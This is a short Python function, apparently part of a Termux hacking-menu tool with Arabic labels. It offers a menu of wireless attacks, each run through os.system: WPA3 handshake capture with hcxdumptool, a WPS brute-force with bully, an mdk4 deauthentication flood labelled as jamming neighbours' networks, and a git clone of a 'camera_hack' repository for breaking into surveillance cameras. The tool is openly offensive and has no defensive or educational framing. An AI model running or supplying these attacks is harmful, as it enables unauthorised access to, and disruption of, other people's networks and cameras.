# 📶 اختراق الشبكات
def wifi_hack():
    show_banner()
    print(Fore.YELLOW + "\n📶 اختر نوع الهجوم:" + Style.RESET_ALL)
    print(Fore.GREEN + "[1] " + Fore.WHITE + "كسر WPA3 (أحدث تقنية)")
    print(Fore.GREEN + "[2] " + Fore.WHITE + "هجوم WPS متقدم")
    print(Fore.GREEN + "[3] " + Fore.WHITE + "تشويش شبكات الجيران")
    print(Fore.GREEN + "[4] " + Fore.WHITE + "اختراق كاميرات المراقبة")
    print(Fore.RED + "[5] " + Fore.WHITE + "رجوع" + Style.RESET_ALL)
    
    choice = input(Fore.MAGENTA + "\n👉 الاختيار: " + Style.RESET_ALL)
    
    if choice == "1":
        os.system("pkg install hcxtools -y && hcxdumptool -i wlan0 -o capture.pcapng")
        print(Fore.GREEN + "\n✅ تم بدء الهجوم! احفظ ملف capture.pcapng" + Style.RESET_ALL)
    elif choice == "2":
        os.system("pkg install bully -y && bully wlan0 -b BSSID")
        print(Fore.GREEN + "\n✅ جاري تنفيذ الهجوم..." + Style.RESET_ALL)
    elif choice == "3":
        os.system("pkg install mdk4 -y && mdk4 wlan0 d -c 6")
        print(Fore.RED + "\n☠️ جاري تشويش الشبكة..." + Style.RESET_ALL)
    elif choice == "4":
        os.system("git clone https://github.com/abn_adlepx/camera_hack.git modules/cameras")
        print(Fore.GREEN + "\n✅ تم التثبيت! أدخل إلى المجلد modules/cameras" + Style.RESET_ALL)
